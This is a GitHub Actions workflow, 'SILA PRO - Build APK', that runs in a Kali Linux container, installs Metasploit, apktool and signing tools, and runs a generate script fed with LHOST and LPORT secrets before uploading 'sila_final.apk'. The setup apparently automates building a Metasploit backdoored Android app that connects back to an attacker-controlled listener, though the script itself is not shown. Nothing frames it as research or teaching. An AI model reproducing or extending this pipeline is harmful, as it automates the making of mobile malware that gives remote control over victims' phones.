name: SILA PRO - Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    container:
      image: kalilinux/kali-rolling:latest

    steps:
    - name: Checkout
      uses: actions/checkout@v4

    - name: Update & Install Tools
      run: |
        apt-get update -y
        apt-get install -y metasploit-framework apktool default-jdk apksigner zip wget git
        apt-get install -y android-sdk --fix-missing || true

    - name: Generate APK
      env:
        LHOST: ${{ secrets.LHOST }}
        LPORT: ${{ secrets.LPORT }}
      run: |
        chmod +x scripts/generate.sh
        ./scripts/generate.sh

    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: sila_pro_apk
        path: output/sila_final.apk
        retention-days: 90
